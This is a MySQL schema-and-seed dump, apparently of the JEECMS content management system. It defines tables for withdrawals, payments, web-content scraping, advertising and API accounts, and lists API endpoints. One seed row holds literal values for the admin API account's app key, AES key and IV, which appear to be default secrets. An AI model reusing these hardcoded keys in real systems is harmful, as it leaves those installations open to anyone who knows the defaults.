/*
 Navicat Premium Data Transfer

 Source Server         : jdjz
 Source Server Type    : MySQL
 Source Server Version : 50560
 Source Host           : localhost:3306
 Source Schema         : test

 Target Server Type    : MySQL
 Target Server Version : 50560
 File Encoding         : 65001

 Date: 29/01/2019 10:24:47
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for jc_account_draw
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_draw`;
CREATE TABLE `jc_account_draw`  (
  `account_draw_id` int(11) NOT NULL AUTO_INCREMENT,
  `draw_user_id` int(11) NOT NULL DEFAULT 0 COMMENT '提现申请者',
  `apply_account` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '申请账户（微信号或支付宝账户）',
  `apply_amount` double NOT NULL DEFAULT 0 COMMENT '提现申请金额',
  `apply_status` tinyint(1) NOT NULL DEFAULT 0 COMMENT '处理状态(0申请中 1申请成功待支付 2申请失败 3提现成功)',
  `account_pay_id` int(11) NULL DEFAULT NULL COMMENT '申请成功后支付ID',
  `apply_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '申请时间',
  PRIMARY KEY (`account_draw_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户账户提现申请' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_account_pay
-- ----------------------------
DROP TABLE IF EXISTS `jc_account_pay`;
CREATE TABLE `jc_account_pay`  (
  `account_pay_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `draw_num` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '内部流水号',
  `pay_user_id` int(11) NOT NULL DEFAULT 0 COMMENT '支付者',
  `draw_user_id` int(11) NOT NULL DEFAULT 0 COMMENT '提现者',
  `pay_account` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '支出账户',
  `draw_account` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '收入账户(微信账户名)',
  `pay_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '支付时间',
  `weixin_num` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '微信流水号',
  `alipay_num` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '支付宝流水号',
  PRIMARY KEY (`account_pay_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '用户账户提现支付' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_acquisition
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition`;
CREATE TABLE `jc_acquisition`  (
  `acquisition_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  `type_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `acq_name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '采集名称',
  `start_time` datetime NULL DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime NULL DEFAULT NULL COMMENT '停止时间',
  `status` int(11) NOT NULL DEFAULT 0 COMMENT '当前状态(0:静止;1:采集;2:暂停)',
  `curr_num` int(11) NOT NULL DEFAULT 0 COMMENT '当前号码',
  `curr_item` int(11) NOT NULL DEFAULT 0 COMMENT '当前条数',
  `total_item` int(11) NOT NULL DEFAULT 0 COMMENT '每页总条数',
  `pause_time` int(11) NOT NULL DEFAULT 0 COMMENT '暂停时间(毫秒)',
  `page_encoding` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'GBK' COMMENT '页面编码',
  `plan_list` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '采集列表',
  `dynamic_addr` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '动态地址',
  `dynamic_start` int(11) NULL DEFAULT NULL COMMENT '页码开始',
  `dynamic_end` int(11) NULL DEFAULT NULL COMMENT '页码结束',
  `linkset_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容链接区开始',
  `linkset_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容链接区结束',
  `link_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容链接开始',
  `link_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容链接结束',
  `title_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题开始',
  `title_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题结束',
  `keywords_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '关键字开始',
  `keywords_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '关键字结束',
  `description_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述开始',
  `description_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述结束',
  `content_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容开始',
  `content_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容结束',
  `pagination_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页开始',
  `pagination_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页结束',
  `queue` int(11) NOT NULL DEFAULT 0 COMMENT '队列',
  `repeat_check_type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT 'NONE' COMMENT '重复类型',
  `img_acqu` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否采集图片',
  `content_prefix` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容地址补全url',
  `img_prefix` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '图片地址补全url',
  `view_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '浏览量开始',
  `view_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '浏览量结束',
  `view_id_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'id前缀',
  `view_id_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'id后缀',
  `view_link` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '浏览量动态访问地址',
  `releaseTime_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发布时间开始',
  `releaseTime_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发布时间结束',
  `author_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者开始',
  `author_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者结束',
  `origin_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来源开始',
  `origin_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '来源结束',
  `releaseTime_format` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '发布时间格式',
  `origin_appoint` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '指定来源',
  `def_type_img` tinyint(1) NOT NULL COMMENT '是否默认类型图0：否1：是',
  `type_img_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类型图开始',
  `type_img_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类型图结束',
  `content_page_prefix` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页地址补全',
  `content_page_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页开始',
  `content_page_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页结束',
  `page_link_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页链接开始',
  `page_link_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容分页链接结束',
  PRIMARY KEY (`acquisition_id`) USING BTREE,
  INDEX `fk_jc_acquisition_channel`(`channel_id`) USING BTREE,
  INDEX `fk_jc_acquisition_contenttype`(`type_id`) USING BTREE,
  INDEX `fk_jc_acquisition_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_acquisition_user`(`user_id`) USING BTREE,
  CONSTRAINT `fk_jc_acquisition_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_acquisition_contenttype` FOREIGN KEY (`type_id`) REFERENCES `jc_content_type` (`type_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_acquisition_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_acquisition_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS采集表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_acquisition_history
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_history`;
CREATE TABLE `jc_acquisition_history`  (
  `history_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题',
  `description` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `acquisition_id` int(11) NULL DEFAULT NULL COMMENT '采集源',
  `content_id` int(11) NULL DEFAULT NULL COMMENT '内容',
  PRIMARY KEY (`history_id`) USING BTREE,
  INDEX `fk_acquisition_history_acquisition`(`acquisition_id`) USING BTREE,
  CONSTRAINT `fk_jc_history_acquisition` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '采集历史记录表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_acquisition_replace
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_replace`;
CREATE TABLE `jc_acquisition_replace`  (
  `replace_id` int(11) NOT NULL AUTO_INCREMENT,
  `acquisition_id` int(11) NOT NULL,
  `keyword` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '关键词',
  `replace_word` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '替换词',
  PRIMARY KEY (`replace_id`) USING BTREE,
  INDEX `fk_jc_acquisition_replace`(`acquisition_id`) USING BTREE,
  CONSTRAINT `fk_jc_acquisition_replace` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '采集内容替换' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_acquisition_shield
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_shield`;
CREATE TABLE `jc_acquisition_shield`  (
  `shield_id` int(11) NOT NULL AUTO_INCREMENT,
  `acquisition_id` int(11) NOT NULL,
  `shield_start` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '屏蔽开始',
  `shield_end` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '屏蔽结束',
  PRIMARY KEY (`shield_id`) USING BTREE,
  INDEX `fk_jc_acquisition_shield`(`acquisition_id`) USING BTREE,
  CONSTRAINT `fk_jc_acquisition_shield` FOREIGN KEY (`acquisition_id`) REFERENCES `jc_acquisition` (`acquisition_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '采集内容屏蔽' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_acquisition_temp
-- ----------------------------
DROP TABLE IF EXISTS `jc_acquisition_temp`;
CREATE TABLE `jc_acquisition_temp`  (
  `temp_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NULL DEFAULT NULL,
  `channel_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '栏目地址',
  `content_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '内容地址',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标题',
  `finish_percent` int(3) NOT NULL DEFAULT 0 COMMENT '百分比',
  `description` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `seq` int(3) NOT NULL DEFAULT 0 COMMENT '顺序',
  PRIMARY KEY (`temp_id`) USING BTREE,
  INDEX `fk_jc_temp_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_temp_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '采集进度临时表' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_advertising
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising`;
CREATE TABLE `jc_advertising`  (
  `advertising_id` int(11) NOT NULL AUTO_INCREMENT,
  `adspace_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '广告名称',
  `category` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '广告类型',
  `ad_code` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '广告代码',
  `ad_weight` int(11) NOT NULL DEFAULT 1 COMMENT '广告权重',
  `display_count` bigint(20) NOT NULL DEFAULT 0 COMMENT '展现次数',
  `click_count` bigint(20) NOT NULL DEFAULT 0 COMMENT '点击次数',
  `start_time` date NULL DEFAULT NULL COMMENT '开始时间',
  `end_time` date NULL DEFAULT NULL COMMENT '结束时间',
  `is_enabled` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`advertising_id`) USING BTREE,
  INDEX `fk_jc_advertising_site`(`site_id`) USING BTREE,
  INDEX `fk_jc_space_advertising`(`adspace_id`) USING BTREE,
  CONSTRAINT `fk_jc_advertising_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_space_advertising` FOREIGN KEY (`adspace_id`) REFERENCES `jc_advertising_space` (`adspace_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS广告表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_advertising
-- ----------------------------
INSERT INTO `jc_advertising` VALUES (1, 1, 1, 'www.jeecms.com', 'text', NULL, 1, 0, 0, NULL, NULL, '1');

-- ----------------------------
-- Table structure for jc_advertising_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_attr`;
CREATE TABLE `jc_advertising_attr`  (
  `advertising_id` int(11) NOT NULL,
  `attr_name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_params_advertising`(`advertising_id`) USING BTREE,
  CONSTRAINT `fk_jc_params_advertising` FOREIGN KEY (`advertising_id`) REFERENCES `jc_advertising` (`advertising_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS广告属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_advertising_attr
-- ----------------------------
INSERT INTO `jc_advertising_attr` VALUES (1, 'text_title', 'www.jeecms.com');
INSERT INTO `jc_advertising_attr` VALUES (1, 'text_target', '_blank');
INSERT INTO `jc_advertising_attr` VALUES (1, 'text_link', 'http://www.jeecms.com');

-- ----------------------------
-- Table structure for jc_advertising_space
-- ----------------------------
DROP TABLE IF EXISTS `jc_advertising_space`;
CREATE TABLE `jc_advertising_space`  (
  `adspace_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ad_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `is_enabled` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '是否启用',
  PRIMARY KEY (`adspace_id`) USING BTREE,
  INDEX `fk_jc_adspace_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_adspace_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS广告版位表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_advertising_space
-- ----------------------------
INSERT INTO `jc_advertising_space` VALUES (1, 1, '1', '111', '1');

-- ----------------------------
-- Table structure for jc_api_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_account`;
CREATE TABLE `jc_api_account`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'appId',
  `app_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'appKey',
  `aes_key` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'AES加解密密钥',
  `disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  `iv_key` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'AES iv key',
  `is_admin` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否默认管理后台API账户',
  `limit_single_device` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否限制单设备同时登陆',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'API应用账户' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_api_account
-- ----------------------------
INSERT INTO `jc_api_account` VALUES (1, '1580387213331704', 'Sd6qkHm9o4LaVluYRX5pUFyNuiu2a8oi', 'S9u978Q31NGPGc5H', 0, 'X83yESM9iShLxfwS', 1, 0);

-- ----------------------------
-- Table structure for jc_api_info
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_info`;
CREATE TABLE `jc_api_info`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `api_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '接口名称',
  `api_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '接口URL',
  `api_code` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '接口代码',
  `disabled` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否禁用',
  `limit_call_day` int(11) NOT NULL DEFAULT 0 COMMENT '每日限制调用次数(0无限制)',
  `call_total_count` int(11) NOT NULL DEFAULT 0 COMMENT '总调用次数',
  `call_month_count` int(11) NOT NULL DEFAULT 0 COMMENT '月调用次数',
  `call_week_count` int(11) NOT NULL DEFAULT 0 COMMENT '周调用次数',
  `call_day_count` int(11) NOT NULL DEFAULT 0 COMMENT '日调用次数',
  `last_call_time` timestamp NULL DEFAULT NULL COMMENT '最后一次调用时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 77 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'API接口信息' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_api_info
-- ----------------------------
INSERT INTO `jc_api_info` VALUES (1, '栏目列表', '/api/channel/list.jspx', '010101', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (2, '单个栏目', '/api/channel/get.jspx', '010102', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (3, '新增栏目', '/api/channel/save.jspx', '010103', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (4, '修改栏目', '/api/channel/update.jspx', '010104', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (5, '内容列表', '/api/content/list.jspx', '010201', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (6, '内容获取', '/api/content/get.jspx', '010202', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (7, '我的内容', '/api/content/mycontents.jspx', '010203', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (8, '新增内容', '/api/content/save.jspx', '010204', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (9, '修改内容', '/api/content/update.jspx', '010205', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (10, '删除内容到回收站', '/api/content/del.jspx', '010206', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (11, '还原内容', '/api/content/recycle.jspx', '010207', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (12, '审核内容', '/api/content/check.jspx', '010208', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (13, '退回内容', '/api/content/reject.jspx', '010209', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (14, '顶内容', '/api/content/up.jspx', '010210', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (15, '踩内容', '/api/content/down.jspx', '010211', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (16, '内容购买', '/api/content/buy.jspx', '010212', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (17, '内容打赏', '/api/content/reward.jspx', '010213', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (18, '内容收藏', '/api/content/collect.jspx', '010301', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (19, '我的收藏', '/api/content/mycollect.jspx', '010302', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (20, '专题列表', '/api/topic/list.jspx', '010401', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (21, '专题获取', '/api/topic/get.jspx', '010402', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (22, '专题保存', '/api/topic/save.jspx', '010403', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (23, '专题修改', '/api/topic/update.jspx', '040404', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (24, '全文检索', '/api/content/search.jspx', '010501', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (25, 'Tag列表', '/api/contenttag/list.jspx', '010601', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (26, '热词列表', '/api/searchword/list.jspx', '010701', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (27, '友情链接列表', '/api/friendlink/list.jspx', '010801', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (28, '友情链接分类列表', '/api/friendlinkctg/list.jspx', '010802', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (29, '广告列表', '/api/ad/list.jspx', '010901', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (30, '广告分类列表', '/api/adctg/list.jspx', '010902', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (31, '单广告获取', '/api/ad/get.jspx', '010903', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (32, '评论列表', '/api/comment/list.jspx', '011001', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (33, '单评论获取', '/api/comment/get.jspx', '011002', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (34, '发布评论', '/api/comment/save.jspx', '011003', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (35, '评论顶', '/comment_up.jspx', '011004', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (36, '评论踩', '/comment_down.jspx', '011005', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (37, '我的评论', '/api/comment/mylist.jspx', '011006', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (38, '留言列表', '/api/guestbook/list.jspx', '011101', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (39, '我的留言', '/api/guestbook/mylist.jspx', '011102', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (40, '留言分类列表', '/api/guestbookctg/list.jspx', '011103', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (41, '单留言获取', '/api/guestbook/get.jspx', '011104', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (42, '发布留言', '/api/guestbook/save.jspx', '011105', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (43, '投票列表', '/api/vote/list.jspx', '011201', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (44, '单个投票', '/api/vote/get.jspx', '011202', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (45, '投票', '/api/vote/save.jspx', '011203', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (46, '新增会员', '/api/user/add.jspx', '011301', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (47, '会员修改资料', '/api/user/edit.jspx', '011302', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (48, '用户修改密码', '/api/user/pwd.jspx', '011303', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (49, '读取用户信息', '/api/user/get.jspx', '011304', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (50, '用户名唯一性检查', '/username_unique.jspx', '011305', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (51, '字典列表', '/api/dictionary/list.jspx', '011401', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (52, '我的职位申请', '/api/resume/myapplys.jspx', '011501', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (53, '申请职位', '/api/resume/apply.jspx', '011502', 0, 0, 0, 0, 0, 0, NULL);
INSERT INTO `jc_api_info` VALUES (54, '撤销申请', '/api/resume/cancelApply.jspx', '011503', 0, 0, 0, 0, 0, 0, NULL);
